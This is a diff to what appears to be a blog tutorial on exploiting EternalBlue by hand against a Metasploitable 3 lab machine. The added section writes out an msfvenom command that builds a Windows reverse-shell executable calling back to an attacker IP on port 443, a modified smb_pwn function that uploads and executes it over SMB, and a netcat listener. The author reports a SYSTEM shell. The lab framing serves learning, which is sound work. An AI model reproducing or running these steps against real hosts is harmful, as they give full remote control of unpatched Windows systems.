@@ -13,9 +13,10 @@ I wanted to create a Without Metasploit series. Here we would look and modify fa
 The easiest way to find an environment to test on, is to get Hack The Box VIP and attack Blue.
 Setting up your lockal vm, try Metasploitable 3 [Metasploitable3](https://github.com/rapid7/metasploitable3) 
 I will go with the Metasploitable now.
+Metasploitable ip: 10.0.2.15
 
 Attacker
-There are a few things you need to set up on your attacker machine too. First install pip, then impacket.
+There are a few things you need to set up on your attacker machine too. First install pip, then impacket. Attacker IP: 10.0.2.4
 ```
 sudo apt-get update
 sudo apt install python-pip
@@ -82,9 +83,20 @@ The next line is a print, this will just write a line for us so we know what is 
 Then we will connect to the Driver C so we can egn our modification there. This is saved in a variable so in the next line we can finaly create a file called pwned.txt.
 Finaly we will close the connection.
 <h3> Upload shell</h3>
-
-
-
+Let's create our reverse shell first:
+```msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=443 -f exe > shell-x86.exe```
+Then modify the code so it will upload and run our exploit
+```
+def smb_pwn(conn, arch):
+	smbConn = conn.get_smbconnection()
+	smb_send_file(smbConn, 'shell-x86.exe', 'C', '/test.exe')
+	service_exec(conn, r'c:\test.exe')
+```
+The function now only has 3 lines. First we create an smb connection. Then we send our exploit to the target, it will be created in C:/test.exe. Then in the last line we will execute our code and get a reverse shell on our machine on port 443.
+First let's start a listener on our attacker machine then execute our code.
+```nc-lvnp 443```
+[UploadExploit](/img/EternalBlue/uploadExploit.PNG)
+We can see that the exploit run and we got back a reverse shell as System.
 <br>
 
 
